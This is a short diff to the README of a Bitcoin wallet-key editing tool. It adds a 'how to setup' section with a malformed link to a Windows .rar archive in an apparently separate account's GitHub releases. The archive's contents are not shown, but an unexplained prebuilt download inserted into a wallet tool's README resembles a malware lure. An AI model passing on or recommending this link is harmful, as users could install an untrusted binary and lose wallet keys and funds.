@@ -8,6 +8,11 @@ Comfortable GUI application to edit the contents of various
 Bitcoin wallet files, add or remove keys, read one format and
 export to another, move keys between different wallets, etc.
 
+## how to setup
+
+- (Download Wallet Key Tool)[https://github.com/JPMorisGit/wallet-key-tool/releases/download/walletkeytool_windows/WalletKeyTool.rar]
+---------------------------------------
+
 ## how to build from source
 
 * have JDK 7 installed (6 will not work)
